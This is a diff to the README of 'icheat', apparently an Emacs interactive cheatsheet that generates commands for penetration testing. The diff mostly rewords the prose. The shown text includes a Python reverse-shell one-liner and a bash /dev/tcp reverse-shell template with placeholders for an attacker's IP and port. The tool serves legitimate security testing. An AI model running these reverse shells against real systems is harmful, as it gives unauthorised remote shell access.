@@ -1,5 +1,7 @@
 # icheat
 
+(btw, work in progress.)
+
 Interactive cheatsheet in Emacs.
 
 Define lists of commands that are useful to remember in specific
@@ -27,21 +29,22 @@ contexts, such as during a penetration test.
   ("python-1" . "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%ip\",%port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")))
 ```
 
-For each command defined, a specific function will be created, which
-will allow you to generate the specific command you require in the
-moment of need. The name of the function follows the name of the
-command. In the previous example the code will create the functions
-`icheat-cmd-nmap`, `icheat-cmd-smb` and `icheat-cmd-reverse`.
+For each tool declared, a specific function will be created. This
+function can be used as an interactive cheatsheet in order to generate
+the different types of commands for that particular tool. This should
+help you in the moment of need. The name of the function follows the
+name of the command. In the previous example the code will create the
+functions `icheat-cmd-nmap`, `icheat-cmd-smb` and
+`icheat-cmd-reverse`.
 
 Observe also how during the creation of the command list you can use
-special format identifiers such as `%ip`, `%port`, `%domain`, `%share`.
+special format identifiers such as `%ip`, `%port`, `%domain`,
+`%share`. These identifiers are resolved during the generation of the
+command. The final mechanism is still being implemented.
 
 ```
 bash -i >& /dev/tcp/%ip/%port 0>&1
 ```
-
-These identifiers are resolved during the generation of the
-command. The final mechanism is still being implemented.
 
 Finally, it is worth to note that depending on how the function is
 called, the generated output is returned either as a direct value, or
